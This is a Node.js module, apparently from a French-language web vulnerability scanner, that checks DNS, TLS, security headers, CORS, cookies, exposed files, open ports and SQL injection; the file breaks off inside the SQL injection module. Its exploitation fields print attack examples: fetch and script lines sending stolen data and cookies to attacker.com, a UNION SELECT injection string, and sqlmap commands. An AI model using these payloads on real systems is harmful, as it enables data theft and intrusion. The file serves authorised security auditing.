'use strict';

/**
 * YHACK Security Scan Manager
 * Professional pentesting with real detection and exploitation guidance
 */

const dns      = require('dns').promises;
const net      = require('net');
const tls      = require('tls');
const https    = require('https');
const fetch    = require('node-fetch');
const nodemailer = require('nodemailer');
const { PAYLOADS } = require('./payloads');

// Un scanner de sécurité doit pouvoir auditer une cible MÊME si son certificat
// est invalide / auto-signé / expiré. Sans ça, node-fetch lève une erreur sur
// chaque requête HTTPS et tous les modules HTTP échouent. Le module TLS analyse
// le certificat séparément, donc on ne perd pas l'info de sécurité du certificat.
const insecureAgent = new https.Agent({ rejectUnauthorized: false });

const SCAN_DELAY   = parseInt(process.env.SCAN_DELAY_MS   || '150');
const SCAN_TIMEOUT = parseInt(process.env.SCAN_TIMEOUT_MS || '8000');

// ─── Email ────────────────────────────────────────────────────────────────────
const transporter = nodemailer.createTransport({
  host:   process.env.SMTP_HOST || 'smtp.gmail.com',
  port:   parseInt(process.env.SMTP_PORT || '587'),
  secure: process.env.SMTP_SECURE === 'true',
  auth:   { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS },
});

async function sendAlert(email, title, target, details) {
  if (!email || process.env.ENABLE_EMAIL_ALERTS !== 'true') return;
  try {
    await transporter.sendMail({
      from:    process.env.ALERT_EMAIL_FROM || '"NetGuard Scanner" <alert@netguard.local>',
      to:      email,
      subject: `[CRITICAL] ${title} on ${target}`,
      text:    `⚠ NETGUARD SECURITY ALERT\n\nTarget: ${target}\nType: ${title}\n\n${details}`,
    });
  } catch (e) {
    console.error('[EMAIL] Send failed:', e.message);
  }
}

// ─── Utilities ────────────────────────────────────────────────────────────────
const wait = ms => new Promise(r => setTimeout(r, ms));

// Ratio de longueur entre deux réponses (1 = identiques, 0 = tout diffère).
// Signal simple et robuste pour la SQLi blind booléenne.
const lenRatio = (a, b) => {
  const la = (a || '').length, lb = (b || '').length;
  if (!la && !lb) return 1;
  if (!la || !lb) return 0;
  return Math.min(la, lb) / Math.max(la, lb);
};

// Détecte un NUMÉRO DE VERSION dans un en-tête (ex: "nginx/1.18.0", "PHP/7.4").
// Le type seul ("nginx", "cloudflare", "Apache") n'est PAS une faille — seule
// la version exposée l'est (elle permet de cibler des CVE précis).
const hasVersion = (v) => /\d+\.\d+/.test(v || '') || /\/\d/.test(v || '');

function log(level, mod, msg, data = {}) {
  const d = Object.keys(data).length ? ' ' + JSON.stringify(data).substring(0, 300) : '';
  console.log(`[${new Date().toISOString()}] [${level}] [${mod}]`, msg + d);
}

// Escape HTML to avoid self-XSS when lines are injected via innerHTML
function esc(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

async function safeFetch(url, opts = {}) {
  const ctrl  = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), opts.timeout || SCAN_TIMEOUT);
  try {
    return await fetch(url, {
      // Ignore les certificats invalides sur les cibles HTTPS (voir insecureAgent).
      agent: parsedURL => (parsedURL.protocol === 'https:' ? insecureAgent : undefined),
      ...opts,
      signal: ctrl.signal,
    });
  } finally {
    clearTimeout(timer);
  }
}

// ─── MODULE: DNS ──────────────────────────────────────────────────────────────
async function testDNS(url, onLine) {
  onLine('▸ [DNS] Résolution &amp; Reconnaissance ...........');
  try {
    const [ipv4r, ipv6r, mxr, txtr, nsr] = await Promise.allSettled([
      dns.resolve4(url.hostname).catch(() => []),
      dns.resolve6(url.hostname).catch(() => []),
      dns.resolveMx(url.hostname).catch(() => []),
      dns.resolveTxt(url.hostname).catch(() => []),
      dns.resolveNs(url.hostname).catch(() => []),
    ]);

    const addresses = [
      ...(ipv4r.value || []).map(a => ({ type: 'A',    address: a })),
      ...(ipv6r.value || []).map(a => ({ type: 'AAAA', address: a })),
    ];
    const mxRecords  = mxr.value  || [];
    const txtRecords = (txtr.value || []).flat();
    const nsRecords  = nsr.value  || [];

    addresses.forEach(a => onLine(`  • ${a.type}: ${esc(a.address)}`));
    if (mxRecords.length) onLine(`  • MX: ${esc(mxRecords.map(r => r.exchange).join(', '))}`);

    const spf   = txtRecords.find(r => r.startsWith('v=spf1'));
    const dmarc = txtRecords.find(r => r.startsWith('v=DMARC1'));
    const warnings = [];

    if (!spf)   { onLine('  ! SPF absent — email spoofing possible');    warnings.push('No SPF record'); }
    if (!dmarc) { onLine('  ! DMARC absent — protection email insuffisante'); warnings.push('No DMARC record'); }

    return {
      status: addresses.length ? 'OK' : 'FAIL',
      addresses: addresses.map(a => a.address),
      mx: mxRecords.map(r => r.exchange),
      ns: nsRecords,
      spf: spf || null,
      dmarc: dmarc || null,
      warnings,
    };
  } catch (e) {
    onLine(`  ! DNS error: ${esc(e.message)}`);
    return { status: 'ERROR', error: e.message };
  }
}

// ─── MODULE: TLS/SSL ──────────────────────────────────────────────────────────
async function testTLS(url, onLine) {
  onLine('▸ [TLS] Certificat &amp; protocoles ..................');

  if (url.protocol === 'http:') {
    onLine('  ! HTTP non chiffré — données transmises en clair');
    return {
      status: 'FAIL',
      encrypted: false,
      exploitation: {
        description: 'Trafic HTTP transmis en clair. Interceptable par n\'importe qui sur le réseau.',
        example: 'Interception avec Wireshark sur le même réseau (Wi-Fi public).',
        tools: ['Wireshark', 'tcpdump', 'mitmproxy', 'Bettercap'],
        impact: 'Vol de credentials, cookies de session, données personnelles en transit',
        cvss: 7.4,
        remediation: 'Déployer HTTPS (Let\'s Encrypt = gratuit), rediriger HTTP 301 → HTTPS, activer HSTS.',
      },
    };
  }

  try {
    const port = parseInt(url.port) || 443;

    const info = await new Promise((resolve, reject) => {
      const socket = tls.connect({
        host: url.hostname, port, servername: url.hostname,
        rejectUnauthorized: false, timeout: 5000,
      });
      socket.on('secureConnect', () => {
        const cert = socket.getPeerCertificate(true);
        resolve({
          authorized:  socket.authorized,
          authError:   socket.authorizationError,
          protocol:    socket.getProtocol(),
          cipher:      socket.getCipher(),
          validFrom:   cert.valid_from,
          validTo:     cert.valid_to,
          subject:     cert.subject,
          issuer:      cert.issuer,
          fingerprint: cert.fingerprint,
        });
        socket.end();
      });
      socket.on('error', reject);
      socket.setTimeout(5000, () => socket.destroy(new Error('TLS timeout')));
    });

    const issues = [];
    const expiry = new Date(info.validTo);
    const daysUntilExpiry = Math.floor((expiry - Date.now()) / 86400000);
    const obsolete = ['TLSv1', 'TLSv1.1'];
    const weakCiphers = ['RC4', 'DES', '3DES', 'MD5', 'NULL', 'EXPORT', 'anon'];

    if (obsolete.includes(info.protocol)) {
      issues.push({ severity: 'HIGH', msg: `${info.protocol} obsolète — vulnérable POODLE/BEAST` });
      onLine(`  ! Protocole obsolète: ${esc(info.protocol)}`);
    } else {
      onLine(`  • Protocole: ${esc(info.protocol)}`);
    }

    if (weakCiphers.some(c => (info.cipher.name || '').includes(c))) {
      issues.push({ severity: 'HIGH', msg: `Cipher faible: ${info.cipher.name}` });
      onLine(`  ! Cipher faible: ${esc(info.cipher.name)}`);
    } else {
      onLine(`  • Cipher: ${esc(info.cipher.name)}`);
    }

    if (!info.authorized) {
      issues.push({ severity: 'HIGH', msg: `Certificat invalide: ${info.authError}` });
      onLine(`  ! Certificat invalide: ${esc(info.authError)}`);
    }

    if (daysUntilExpiry < 0) {
      issues.push({ severity: 'CRITICAL', msg: `Certificat EXPIRÉ depuis ${-daysUntilExpiry}j` });
      onLine(`  ! Certificat EXPIRÉ depuis ${-daysUntilExpiry} jours`);
    } else if (daysUntilExpiry < 30) {
      issues.push({ severity: 'MEDIUM', msg: `Expiration dans ${daysUntilExpiry} jours` });
      onLine(`  ! Expire dans ${daysUntilExpiry} jours`);
    } else {
      onLine(`  • Valide jusqu'au ${esc(info.validTo)}`);
    }

    const hasCritical = issues.some(i => ['CRITICAL', 'HIGH'].includes(i.severity));
    const result = {
      status: hasCritical ? 'FAIL' : issues.length > 0 ? 'WARN' : 'OK',
      encrypted: true,
      protocol: info.protocol,
      cipher: info.cipher.name,
      validTo: info.validTo,
      authorized: info.authorized,
      daysUntilExpiry,
      issues,
    };

    if (issues.length > 0) {
      result.exploitation = {
        description: 'Problèmes TLS permettant des attaques Man-in-the-Middle ou usurpation d\'identité.',
        example: 'mitmproxy -p 8080 --ssl-insecure (après ARP spoofing sur le réseau local)',
        tools: ['mitmproxy', 'sslstrip', 'SSLyze', 'testssl.sh', 'Bettercap'],
        impact: 'Déchiffrement du trafic, vol de session, injection de contenu malveillant',
        cvss: 7.4,
        remediation: 'TLS 1.3 uniquement, ciphers ECDHE+AES-GCM, HSTS avec preload, certificat Let\'s Encrypt.',
      };
    }

    return result;
  } catch (e) {
    onLine(`  ! TLS erreur: ${esc(e.message)}`);
    return { status: 'ERROR', error: e.message };
  }
}

// ─── MODULE: Headers ──────────────────────────────────────────────────────────
async function testHeaders(url, onLine) {
  onLine('▸ [HEADERS] En-têtes de sécurité ................');
  try {
    const resp = await safeFetch(url.href, { method: 'GET', redirect: 'follow' });
    const headers = {};
    resp.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });

    const checks = [
      { key: 'content-security-policy',   label: 'CSP',                 severity: 'HIGH',
        exploit: 'Sans CSP, un XSS peut charger des scripts externes et exfiltrer des données.' },
      { key: 'strict-transport-security', label: 'HSTS',                severity: 'MEDIUM',
        exploit: 'Sans HSTS, sslstrip peut forcer la connexion HTTP et intercepter les sessions.' },
      { key: 'x-frame-options',           label: 'X-Frame-Options',     severity: 'MEDIUM',
        exploit: 'Clickjacking: intégrer la page dans une iframe invisible superposée à un bouton malveillant.' },
      { key: 'x-content-type-options',    label: 'X-Content-Type-Options', severity: 'LOW',
        exploit: 'MIME sniffing: le navigateur peut exécuter du JS déguisé en image/CSS.' },
      { key: 'referrer-policy',           label: 'Referrer-Policy',     severity: 'LOW',
        exploit: 'Fuite de tokens/IDs dans l\'en-tête Referer vers des sites tiers.' },
      { key: 'permissions-policy',        label: 'Permissions-Policy',  severity: 'LOW',
        exploit: 'Accès non contrôlé à caméra/micro/géoloc via XSS.' },
    ];

    const missing   = [];
    const present   = [];
    const exposing  = [];

    checks.forEach(c => {
      if (headers[c.key]) { present.push(c.label); onLine(`  ✓ ${c.label}: présent`); }
      else { missing.push(c); onLine(`  ! ${c.label} [${c.severity}] manquant`); }
    });

    // Information disclosure — seule la VERSION exposée est une faille.
    // Le type seul (Server: nginx) est informatif, pas une vulnérabilité.
    ['server', 'x-powered-by', 'x-aspnet-version', 'x-aspnetmvc-version',
     'x-generator', 'x-runtime'].forEach(h => {
      if (!headers[h]) return;
      // Les en-têtes x-aspnet*-version sont par nature une version.
      const versioned = hasVersion(headers[h]) || /version/.test(h);
      if (versioned) {
        exposing.push({ header: h, value: headers[h] });
        onLine(`  ! Version exposée: ${esc(h)}: ${esc(headers[h])}`);
      } else {
        onLine(`  • ${esc(h)}: ${esc(headers[h])} (type seul, sans version — OK)`);
      }
    });

    // CSP quality
    const cspIssues = [];
    const csp = headers['content-security-policy'];
    if (csp) {
      if (csp.includes("'unsafe-inline'")) cspIssues.push("unsafe-inline présent — XSS inline possible");
      if (csp.includes("'unsafe-eval'"))   cspIssues.push("unsafe-eval présent — eval() dangereux");
      if (csp.includes(' * ') || csp.includes("'*'")) cspIssues.push("wildcard * trop permissif");
    }

    const highMissing = missing.filter(m => m.severity === 'HIGH');
    const medMissing  = missing.filter(m => m.severity === 'MEDIUM');
    const status = highMissing.length > 0 ? 'FAIL' : medMissing.length >= 2 ? 'WARN' : 'OK';

    const result = {
      status,
      score: Math.round(((checks.length - missing.length) / checks.length) * 100),
      missing: missing.map(m => ({ name: m.label, severity: m.severity })),
      present,
      info_disclosure: exposing,
      csp_issues: cspIssues,
    };

    const exploitable = missing.filter(m => ['HIGH', 'MEDIUM'].includes(m.severity));
    if (exploitable.length > 0 || exposing.length > 0) {
      result.exploitation = {
        missing_headers: exploitable.map(m => ({
          header: m.label,
          scenario: m.exploit,
          severity: m.severity,
        })),
        info_leakage: exposing.map(e => ({
          header: e.header,
          value: e.value,
          risk: 'Permet de cibler des CVE connus pour cette version/technologie.',
        })),
        tools: ['Burp Suite', 'OWASP ZAP', 'securityheaders.com'],
        example: `curl -sI ${url.href} | grep -iE "server|x-powered|csp|hsts|x-frame"`,
        cvss: highMissing.length > 0 ? 6.1 : 4.3,
        remediation: 'Ajouter les headers manquants dans la config serveur (Nginx/Apache) ou via middleware.',
      };
    }

    return result;
  } catch (e) {
    onLine(`  ! Headers erreur: ${esc(e.message)}`);
    return { status: 'ERROR', error: e.message };
  }
}

// ─── MODULE: CORS ─────────────────────────────────────────────────────────────
async function testCORS(url, onLine, alertEmail) {
  onLine('▸ [CORS] Configuration Cross-Origin .............');
  try {
    const evilOrigin = 'https://evil.netguard.test';

    const resp = await safeFetch(url.href, {
      headers: { Origin: evilOrigin, 'User-Agent': 'NetGuard-Scanner/1.0' },
      timeout: 5000,
    });

    const acao = resp.headers.get('access-control-allow-origin');
    const acac = resp.headers.get('access-control-allow-credentials');

    if (acao === '*') {
      onLine('  ! CORS wildcard (*) — toute origine autorisée');
      return {
        status: 'WARN',
        vulnerable: true,
        type: 'wildcard',
        exploitation: {
          description: 'Wildcard CORS: tout site peut lire les réponses de votre API depuis un navigateur.',
          example: `fetch('${url.href}/api/data').then(r=>r.json()).then(console.log)`,
          note: 'Avec *, les credentials (cookies) ne sont pas envoyés — moins critique pour les APIs publiques.',
          tools: ['Burp Suite', 'curl'],
          impact: 'Lecture de données API non authentifiées depuis n\'importe quel site malveillant.',
          cvss: 5.3,
          remediation: 'Whitelist des origines explicites. Éviter * sur des APIs qui renvoient des données sensibles.',
        },
      };
    }

    if (acao === evilOrigin) {
      const withCredentials = acac === 'true';
      onLine(`  ! CORS réflexif${withCredentials ? ' + credentials' : ''} — CRITIQUE`);
      if (alertEmail) await sendAlert(alertEmail, 'CORS_MISCONFIGURATION', url.href,
        `Origin reflection detected${withCredentials ? ' with credentials=true' : ''}`);
      return {
        status: 'FAIL',
        vulnerable: true,
        type: withCredentials ? 'reflection_with_credentials' : 'reflection',
        exploitation: {
          description: withCredentials
            ? 'CORS réflexif + credentials=true: un site malveillant peut lire vos données authentifiées.'
            : 'CORS réflexif: le serveur accepte n\'importe quelle origine — lectures cross-origin possibles.',
          example: withCredentials
            ? `// Depuis evil.com:\nfetch('${url.href}/api/user', {credentials: 'include'})\n  .then(r => r.json())\n  .then(d => fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(d))))`
            : `fetch('${url.href}/api/data', {mode: 'cors'})\n  .then(r => r.text())\n  .then(d => navigator.sendBeacon('https://attacker.com', d))`,
          tools: ['Burp Suite', 'cors-poc-generator'],
          impact: withCredentials
            ? 'Vol de données utilisateur authentifié, CSRF complet, compte takeover.'
            : 'Lecture de données API cross-origin.',
          cvss: withCredentials ? 9.1 : 6.5,
          remediation: 'Whitelist explicite des origines, valider Origin côté serveur, ne jamais refléter Origin sans vérification.',
        },
      };
    }

    onLine('  ✓ CORS correctement configuré');
    return { status: 'OK', vulnerable: false };
  } catch (e) {
    onLine(`  ! CORS erreur: ${esc(e.message)}`);
    return { status: 'ERROR', error: e.message };
  }
}

// ─── MODULE: Cookies ──────────────────────────────────────────────────────────
async function testCookies(url, onLine) {
  onLine('▸ [COOKIES] Flags de sécurité ...................');
  try {
    const resp = await safeFetch(url.href, { redirect: 'follow' });

    // node-fetch v2 stores raw headers differently
    const rawHeaders = resp.headers.raw ? resp.headers.raw() : {};
    const setCookies = rawHeaders['set-cookie'] || [];

    if (!setCookies.length) {
      onLine('  • Aucun cookie défini sur cette page');
      return { status: 'OK', cookies: [] };
    }

    const analyzed = [];
    const allIssues = [];

    setCookies.forEach(cookie => {
      const name  = (cookie.split('=')[0] || '').trim();
      const lower = cookie.toLowerCase();
      const issues = [];

      if (!lower.includes('httponly'))
        issues.push({ flag: 'HttpOnly', severity: 'HIGH',
          exploit: `XSS peut lire ce cookie via document.cookie et l'exfiltrer.` });

      if (!lower.includes('; secure') && url.protocol === 'https:')
        issues.push({ flag: 'Secure', severity: 'MEDIUM',
          exploit: 'Cookie envoyé en clair sur des sous-requêtes HTTP.' });

      if (!lower.includes('samesite'))
        issues.push({ flag: 'SameSite', severity: 'MEDIUM',
          exploit: 'Vulnérable aux attaques CSRF.' });

      const isSession = /sess|token|auth|jwt|id/i.test(name);
      analyzed.push({ name, issues, isSession });
      allIssues.push(...issues);

      if (issues.length) onLine(`  ! Cookie '${esc(name)}': manque ${issues.map(i => i.flag).join(', ')}`);
      else              onLine(`  ✓ Cookie '${esc(name)}': flags OK`);
    });

    const criticalCount = allIssues.filter(i => i.severity === 'HIGH').length;
    const status = criticalCount > 0 ? 'FAIL' : allIssues.length > 0 ? 'WARN' : 'OK';
    const result = { status, cookies: analyzed };

    if (criticalCount > 0) {
      const victim = analyzed.find(c => c.isSession && c.issues.some(i => i.flag === 'HttpOnly'));
      result.exploitation = {
        description: 'Cookies de session volables via XSS (absence d\'HttpOnly).',
        example: victim
          ? `<script>fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie))</script>`
          : `<script>document.location='https://attacker.com/?c='+document.cookie</script>`,
        tools: ['BeEF Framework', 'XSSer', 'Burp Suite'],
        impact: 'Vol de session, usurpation d\'identité complète.',
        cvss: 8.1,
        remediation: 'Ajouter HttpOnly; Secure; SameSite=Strict sur tous les cookies de session.',
      };
    }

    return result;
  } catch (e) {
    onLine(`  ! Cookies erreur: ${esc(e.message)}`);
    return { status: 'ERROR', error: e.message };
  }
}

// ─── MODULE: Technology Detection ────────────────────────────────────────────
async function testTechStack(url, onLine) {
  onLine('▸ [TECH] Détection de technologies ..............');
  try {
    const resp = await safeFetch(url.href, { redirect: 'follow' });
    const headers = {};
    resp.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
    const body = await resp.text();
    const techs = [];

    // Server/framework via headers — "disclosed" seulement si une VERSION est
    // exposée (le type seul, ex. "nginx", n'est pas une faille en soi).
    if (headers['server']) {
      const versioned = hasVersion(headers['server']);
      techs.push({ name: headers['server'], category: 'server', disclosed: versioned, version_exposed: versioned });
      onLine(versioned
        ? `  ! Version serveur exposée: ${esc(headers['server'])}`
        : `  • Serveur: ${esc(headers['server'])} (type seul, sans version — OK)`);
    }
    if (headers['x-powered-by']) {
      const versioned = hasVersion(headers['x-powered-by']);
      techs.push({ name: headers['x-powered-by'], category: 'framework', disclosed: versioned, version_exposed: versioned });
      onLine(versioned
        ? `  ! Techno + version exposée: ${esc(headers['x-powered-by'])}`
        : `  • Techno: ${esc(headers['x-powered-by'])} (sans version)`);
    }

    // CMS
    if (body.includes('wp-content') || body.includes('wp-includes') || headers['x-pingback']) {
      const ver = (body.match(/WordPress\s*([\d.]+)/) || [])[1] || null;
      techs.push({ name: 'WordPress', category: 'cms', version: ver });
      onLine(`  ! WordPress${ver ? ' v' + ver : ''} détecté`);
    }
    if (body.includes('/sites/default/files') || body.includes('Drupal.settings')) {
      techs.push({ name: 'Drupal', category: 'cms' });
      onLine('  ! Drupal détecté (attention: Drupalgeddon CVE-2018-7600)');
    }
    if (body.includes('/components/com_')) {
      techs.push({ name: 'Joomla', category: 'cms' });
      onLine('  ! Joomla détecté');
    }
    if (body.includes('/typo3/') || body.includes('typo3conf')) {
      techs.push({ name: 'TYPO3', category: 'cms' });
      onLine('  ! TYPO3 détecté');
    }

    // JS frameworks (via body hints)
    if (body.includes('__REACT') || body.includes('data-reactroot'))
      techs.push({ name: 'React', category: 'js' });
    if (body.includes('ng-version=') || body.includes('ng-app'))
      techs.push({ name: 'Angular', category: 'js' });
    if (body.includes('__VUE') || body.includes('data-v-'))
      techs.push({ name: 'Vue.js', category: 'js' });

    const jqVer = (body.match(/jquery[^\d]+([\d.]+)/i) || [])[1];
    if (jqVer) techs.push({ name: `jQuery ${jqVer}`, category: 'js' });

    // Admin panel discovery (sequential, limited)
    for (const p of ['/wp-admin', '/administrator', '/admin', '/phpmyadmin']) {
      try {
        const r = await safeFetch(new URL(p, url.href).href, { timeout: 3000, redirect: 'manual' });
        if (r.status !== 404 && r.status !== 410) {
          techs.push({ name: `Admin panel: ${p}`, category: 'admin', httpStatus: r.status });
          onLine(`  ! Panel admin trouvé: ${esc(p)} (HTTP ${r.status})`);
        }
      } catch (_) {}
      await wait(100);
    }

    const hasDisclosure = techs.some(t => t.disclosed);
    if (!hasDisclosure && techs.length === 0) onLine('  • Technologies non identifiées depuis l\'extérieur');

    const result = {
      status: hasDisclosure ? 'WARN' : techs.some(t => t.category === 'admin') ? 'FAIL' : 'OK',
      technologies: techs,
    };

    if (hasDisclosure || techs.some(t => t.category === 'admin')) {
      result.exploitation = {
        description: 'Les versions/technologies exposées permettent de cibler des CVE spécifiques.',
        example: `searchsploit "${techs.filter(t => t.disclosed || t.category === 'cms').map(t => t.name).join('" -o "')}"`,
        tools: ['Metasploit', 'searchsploit', 'vulners.com', 'CVE Details', 'WPScan (WordPress)'],
        impact: 'Exploitation de vulnérabilités connues (CVE), brute-force des panels admin.',
        cvss: 5.3,
        remediation: 'Supprimer Server, X-Powered-By. Masquer les versions. Restreindre l\'accès aux panels admin par IP.',
      };
    }

    return result;
  } catch (e) {
    onLine(`  ! Tech detection erreur: ${esc(e.message)}`);
    return { status: 'ERROR', error: e.message };
  }
}

// ─── MODULE: Sensitive Files ──────────────────────────────────────────────────
async function testSensitiveFiles(url, onLine) {
  onLine('▸ [FILES] Fichiers &amp; chemins sensibles ...........');
  const found = [];

  for (const file of PAYLOADS.sensitiveFiles) {
    try {
      const u    = new URL(file, url.href);
      const resp = await safeFetch(u.href, { timeout: 3000, redirect: 'follow' });

      if (resp.status === 200) {
        const ct   = resp.headers.get('content-type') || '';
        const text = await resp.text();
        // Reject HTML error pages disguised as 200
        const isHtmlPage = ct.includes('text/html') || text.trimStart().startsWith('<!DOCTYPE') || text.trimStart().startsWith('<html');
        if (!isHtmlPage && text.length > 0) {
          found.push({ path: file, size: text.length });
          onLine(`  ! Exposé: ${esc(file)} (${text.length} bytes)`);
        } else if (file === '/robots.txt' || file === '/sitemap.xml') {
          // Always report these even as HTML (rare edge case)
          found.push({ path: file, size: text.length, info: true });
          onLine(`  • ${esc(file)} accessible (informatif)`);
        }
      }
    } catch (_) {}
    await wait(60);
  }

  if (!found.filter(f => !f.info).length) onLine('  ✓ Aucun fichier critique exposé');

  const criticalPaths = ['/.env', '/.env.local', '/.env.production', '/.git/config',
    '/backup.sql', '/database.sql', '/.htpasswd', '/.ssh/id_rsa', '/id_rsa'];
  const critical = found.filter(f => criticalPaths.includes(f.path));

  const result = {
    status: critical.length > 0 ? 'FAIL' : found.filter(f => !f.info).length > 0 ? 'WARN' : 'OK',
    exposed: found,
  };

  if (critical.length > 0) {
    result.exploitation = {
      description: `Fichiers critiques exposés publiquement: ${critical.map(f => f.path).join(', ')}`,
      example: critical.map(f => `curl -s ${url.href}${f.path}`).join('\n'),
      impact: critical.some(f => f.path.includes('.env'))
        ? 'Credentials DB/SMTP/API en clair → compromission totale du système.'
        : critical.some(f => f.path.includes('.git'))
        ? 'Accès au code source complet et à l\'historique git (mots de passe commités).'
        : 'Accès aux données sensibles de l\'application.',
      tools: ['curl', 'wget', 'GitDumper (pour .git)', 'dirsearch'],
      cvss: 9.8,
      remediation: 'Bloquer l\'accès dans .htaccess ou Nginx. Déplacer les fichiers hors du webroot.',
    };
  }

  return result;
}

// ─── MODULE: robots.txt ───────────────────────────────────────────────────────
async function testRobots(url, onLine) {
  onLine('▸ [ROBOTS] Analyse robots.txt ...................');
  try {
    const resp = await safeFetch(new URL('/robots.txt', url.href).href, { timeout: 4000 });
    if (resp.status !== 200) {
      onLine('  • robots.txt absent');
      return { status: 'OK', found: false };
    }

    const text      = await resp.text();
    const disallowed = [];
    const sensitive  = /admin|backup|private|secret|config|api\/|internal|database|\.env/i;

    text.split('\n').forEach(line => {
      if (line.toLowerCase().startsWith('disallow:')) {
        const path = (line.split(':')[1] || '').trim();
        if (path && path !== '/') disallowed.push(path);
      }
    });

    const sensitivePaths = disallowed.filter(p => sensitive.test(p));
    sensitivePaths.forEach(p => onLine(`  ! Chemin sensible révélé: ${esc(p)}`));
    if (!sensitivePaths.length && disallowed.length) onLine(`  • ${disallowed.length} chemin(s) Disallow (aucun sensible)`);

    if (!sensitivePaths.length) return { status: 'OK', found: true, disallowed_count: disallowed.length };

    return {
      status: 'WARN',
      found: true,
      disallowed,
      sensitive_paths: sensitivePaths,
      exploitation: {
        description: 'robots.txt révèle des chemins que l\'admin ne veut pas indexer — souvent des zones sensibles.',
        example: sensitivePaths.map(p => `curl -s ${url.href}${p}`).join('\n'),
        tools: ['curl', 'Burp Suite Spider', 'DirBuster'],
        impact: 'Découverte de panels admin, APIs privées, backups, endpoints non documentés.',
        cvss: 5.3,
        remediation: 'Ne pas lister les chemins sensibles dans robots.txt — ça ne les protège pas, ça les révèle.',
      },
    };
  } catch (e) {
    return { status: 'OK', error: e.message };
  }
}

// ─── MODULE: Port Scan ────────────────────────────────────────────────────────
async function testPorts(url, onLine) {
  onLine('▸ [PORTS] Scan de ports .........................');
  const targets = [
    { port: 21,    service: 'FTP',           risky: true  },
    { port: 22,    service: 'SSH',           risky: false },
    { port: 23,    service: 'Telnet',        risky: true  },
    { port: 25,    service: 'SMTP',          risky: false },
    { port: 80,    service: 'HTTP',          risky: false },
    { port: 443,   service: 'HTTPS',         risky: false },
    { port: 1433,  service: 'MSSQL',         risky: true  },
    { port: 3306,  service: 'MySQL',         risky: true  },
    { port: 3389,  service: 'RDP',           risky: true  },
    { port: 4444,  service: 'Metasploit',    risky: true  },
    { port: 5432,  service: 'PostgreSQL',    risky: true  },
    { port: 5601,  service: 'Kibana',        risky: true  },
    { port: 5984,  service: 'CouchDB',       risky: true  },
    { port: 6379,  service: 'Redis',         risky: true  },
    { port: 8080,  service: 'HTTP-Alt',      risky: false },
    { port: 8443,  service: 'HTTPS-Alt',     risky: false },
    { port: 8888,  service: 'Jupyter',       risky: true  },
    { port: 9000,  service: 'PHP-FPM',       risky: false },
    { port: 9200,  service: 'Elasticsearch', risky: true  },
    { port: 11211, service: 'Memcached',     risky: true  },
    { port: 27017, service: 'MongoDB',       risky: true  },
    { port: 2375,  service: 'Docker API',    risky: true  },
  ];

  const open = await Promise.all(targets.map(({ port, service, risky }) =>
    new Promise(resolve => {
      const s = net.createConnection({ host: url.hostname, port, timeout: 1500 });
      s.on('connect',  () => { s.destroy(); resolve({ port, service, risky }); });
      s.on('error',    () => resolve(null));
      s.setTimeout(1500, () => { s.destroy(); resolve(null); });
    })
  )).then(results => results.filter(Boolean));

  const riskyOpen = open.filter(p => p.risky);
  open.forEach(p => {
    if (p.risky) onLine(`  ! ${p.port}/${esc(p.service)} ouvert — NE DEVRAIT PAS ÊTRE PUBLIC`);
    else         onLine(`  • ${p.port}/${esc(p.service)} ouvert`);
  });
  if (!open.length) onLine('  ✓ Aucun port exposé');

  const result = {
    status: riskyOpen.length > 0 ? 'FAIL' : open.length > 3 ? 'WARN' : 'OK',
    open_ports: open,
  };

  if (riskyOpen.length > 0) {
    const db   = riskyOpen.find(p => [3306, 5432, 27017, 9200].includes(p.port));
    const docker = riskyOpen.find(p => p.port === 2375);
    const redis  = riskyOpen.find(p => p.port === 6379);
    result.exploitation = {
      description: `Services internes exposés sur Internet: ${riskyOpen.map(p => `${p.service}:${p.port}`).join(', ')}`,
      example: db
        ? `mysql -h ${url.hostname} -P ${db.port} -u root --password=\n# OU: nmap -sV ${url.hostname} -p ${riskyOpen.map(p => p.port).join(',')}`
        : docker
        ? `curl http://${url.hostname}:2375/v1.41/containers/json  # Accès Docker sans auth`
        : redis
        ? `redis-cli -h ${url.hostname} -p 6379 INFO  # Redis sans auth`
        : `nmap -sV ${url.hostname} -p ${riskyOpen.map(p => p.port).join(',')}`,
      tools: ['nmap', 'masscan', 'Metasploit', 'redis-cli', 'mysql-client'],
      impact: db
        ? 'Accès direct à la base de données depuis Internet → dump complet.'
        : docker
        ? 'Docker API sans auth → RCE en tant que root sur l\'hôte.'
        : 'Accès non authentifié aux services internes.',
      cvss: db || docker ? 9.8 : 7.5,
      remediation: 'Firewall: autoriser uniquement 80/443. Services DB/cache: bind sur 127.0.0.1 uniquement.',
    };
  }

  return result;
}

// ─── MODULE: SQL Injection ────────────────────────────────────────────────────
async function testSQLi(url, onLine, alertEmail) {
  onLine('▸ [SQLi] Injection SQL ...........................');

  // — Error-based —
  for (const payload of PAYLOADS.sqli.error_payloads) {
    for (const param of PAYLOADS.sqli.params.slice(0, 6)) {
      try {
        const u = new URL(url.href);
        u.searchParams.set(param, payload);
        const resp = await safeFetch(u.href, { timeout: 6000 });
        const text = await resp.text();

        if (PAYLOADS.sqli.errorPatterns.some(p => p.test(text))) {
          onLine(`  ! SQLi ERROR-BASED sur '${esc(param)}'`);
          if (alertEmail) await sendAlert(alertEmail, 'SQL_INJECTION', url.href, `Error-based on param: ${param}`);
          return {
            status: 'FAIL',
            vulnerable: true,
            type: 'error_based',
            param,
            payload,
            exploitation: {
              description: 'SQLi error-based: le message d\'erreur SQL est visible — extraction directe de données possible.',
              example: `sqlmap -u "${u.href}" -p "${param}" --dbs --batch --level=3 --risk=2`,
              manual: `# Test manuel:\n${url.href}?${param}=' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`,
              tools: ['sqlmap (automatique)', 'Burp Suite (manuel)', 'Havij'],
              impact: 'Dump complet de la DB, bypass d\'authentification, lecture de fichiers (LOAD_FILE), potentiellement RCE (xp_cmdshell sur MSSQL).',
              cvss: 9.8,
              remediation: 'Prepared statements (PDO/parameterized queries). Désactiver les messages d\'erreur SQL en prod. WAF.',
            },
          };
        }
      } catch (_) {}
      await wait(SCAN_DELAY);
    }
  }

  // — Time-based blind —
